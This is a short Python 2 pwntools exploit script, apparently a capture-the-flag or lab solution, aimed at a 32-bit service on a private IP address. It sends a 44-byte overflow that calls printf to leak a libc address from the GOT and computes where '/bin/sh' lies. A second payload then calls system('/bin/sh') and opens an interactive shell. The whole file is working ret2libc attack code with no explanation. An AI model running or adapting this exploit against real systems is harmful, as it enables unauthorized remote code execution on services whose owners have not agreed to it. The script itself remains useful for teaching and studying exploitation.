#!/usr/bin/env python2
from pwn import *
import struct

p = remote("192.168.56.101", 32812)
p.recvuntil('>')

pwnme = p32(0x080485f6)
#main = p32(0x0804857b)
printf_plt = p32(0x8048400)
printf_got = p32(0x804a00c)
system_plt = p32(0x8048430)


buf = "A"*44
buf += printf_plt
buf += pwnme
buf += printf_got

p.sendline(buf)
leak_addr = u32(p.recvuntil("Go")[1:5])
print leak_addr
#print "leaked address is at: 0x{:08x}".format(leak_addr)
print ("leaked address is at: " + hex(leak_addr))
bin_sh = leak_addr + 0x113488
print ("bin sh is at: " + hex(bin_sh))


print p.recvuntil('>')
buf2 = "A"*44
buf2 += system_plt
buf2 += "BBBB"
buf2 += p32(bin_sh)
p.sendline(buf2)
p.interactive()
